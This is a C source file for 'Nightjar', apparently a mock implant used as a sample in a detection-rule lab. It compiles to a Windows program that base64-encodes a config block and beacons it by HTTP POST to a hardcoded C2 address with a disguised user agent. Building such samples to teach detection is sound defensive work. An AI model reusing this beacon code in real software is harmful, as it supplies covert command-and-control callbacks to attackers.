/* Nightjar: the implant family this lab's corpus is built from.
 *
 * It is a real PE32+ built by x86_64-w64-mingw32-gcc from this source, and it
 * is inert on the machines the lab runs on: PE code does not execute on Linux,
 * and nothing in the lab ever runs it. What it is FOR is to carry, in a real
 * import table and a real section layout, the three features every rule in the
 * handout is written against:
 *
 *   1. a configuration block whose first ten bytes are the family tag
 *      NJCFG3|c2=, followed by a C2 address, a build tag and a key that all
 *      differ from build to build,
 *   2. an import of WININET.dll, because the beacon is an HTTP POST, and
 *   3. an import of CRYPT32.dll, because the configuration block is base64
 *      encoded before it is sent.
 *
 * NJ_CFG_IN_RESOURCE selects where the configuration block lives. Undefined,
 * it is a writable global and lands in .data. Defined, the block is an RCDATA
 * resource compiled by windres and the build gains a .rsrc section, which is
 * the same string in a different place: the point of building it both ways is
 * that a rule keyed on the string does not care and a rule keyed on the
 * section layout does.
 */
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>

#ifndef NJ_CFG
#define NJ_CFG "NJCFG3|c2=126.9.0.40:8443|id=WKS-01|k=7f2a1c"
#endif
#ifndef NJ_HOST
#define NJ_HOST "126.9.0.40"
#endif
#ifndef NJ_PORT
#define NJ_PORT 8443
#endif

#ifdef NJ_CFG_IN_RESOURCE
static const char *config_block(void)
{
    HRSRC h = FindResourceA(NULL, MAKEINTRESOURCEA(1), RT_RCDATA);
    HGLOBAL g;
    if (!h) return NULL;
    g = LoadResource(NULL, h);
    if (!g) return NULL;
    return (const char *)LockResource(g);
}
#else
static char nj_config[128] = NJ_CFG;
static const char *config_block(void) { return nj_config; }
#endif

int main(void)
{
    const char *cfg = config_block();
    char encoded[512];
    DWORD encoded_len = sizeof encoded;
    HINTERNET session, conn, req;

    if (!cfg) return 1;

    /* CRYPT32.dll. The configuration block goes out base64 encoded rather than
     * in the clear, which is why the family imports a cryptography library at
     * all and why that import is the half of its fingerprint that has nothing
     * to do with the network. */
    if (!CryptBinaryToStringA((const BYTE *)cfg, (DWORD)lstrlenA(cfg),
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                              encoded, &encoded_len))
        return 1;

    /* WININET.dll. */
    session = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                            INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!session) return 1;

    conn = InternetConnectA(session, NJ_HOST, NJ_PORT, NULL, NULL,
                            INTERNET_SERVICE_HTTP, 0, 0);
    if (conn) {
        req = HttpOpenRequestA(conn, "POST", "/api/v1/beacon", NULL, NULL,
                               NULL, 0, 0);
        if (req && HttpSendRequestA(req, NULL, 0, encoded, encoded_len)) {
            char reply[512];
            DWORD got = 0;
            while (InternetReadFile(req, reply, sizeof reply, &got) && got)
                Sleep(10);
        }
        if (req) InternetCloseHandle(req);
        InternetCloseHandle(conn);
    }

    InternetCloseHandle(session);
    return 0;
}
